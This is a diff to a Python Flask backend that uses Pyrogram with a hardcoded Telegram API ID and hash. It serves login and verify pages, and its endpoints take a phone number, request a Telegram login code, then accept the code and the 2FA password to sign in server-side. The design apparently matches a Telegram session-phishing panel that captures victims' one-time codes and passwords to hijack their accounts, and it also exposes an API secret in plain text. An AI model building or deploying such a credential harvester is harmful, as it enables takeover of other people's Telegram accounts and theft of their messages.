@@ -1,10 +1,31 @@
+import os
 import asyncio
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 from pyrogram import Client
 from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid
 
-# ... (বাকি কনফিগারেশন একই থাকবে)
+app = Flask(__name__)
+CORS(app)
+
+API_ID = 33511945
+API_HASH = "d044392a17690c14ee5b4a23651a0700"
+
+temp_clients = {}
+
+@app.route('/', methods=['GET'])
+def home():
+    try:
+        return send_file('index.html')
+    except Exception:
+        return "index.html not found", 404
+
+@app.route('/verify', methods=['GET'])
+def verify_page():
+    try:
+        return send_file('verify.html')
+    except Exception:
+        return "verify.html not found", 404
 
 @app.route('/send-code', methods=['POST'])
 def send_code():
@@ -18,7 +39,6 @@ def send_code():
         session_name = f"session_{phone.replace('+', '')}"
         client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
         
-        # থ্রেডের জন্য নতুন ইভেন্ট লুপ তৈরি করে রান করা
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         
@@ -38,7 +58,6 @@ def send_code():
         return jsonify({"status": "success", "message": "OTP code sent to Telegram!"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
-
 
 @app.route('/verify-code', methods=['POST'])
 def verify_code():
@@ -80,3 +99,7 @@ def verify_code():
         return jsonify({"status": "success", "message": "2FA Password required"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 400
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
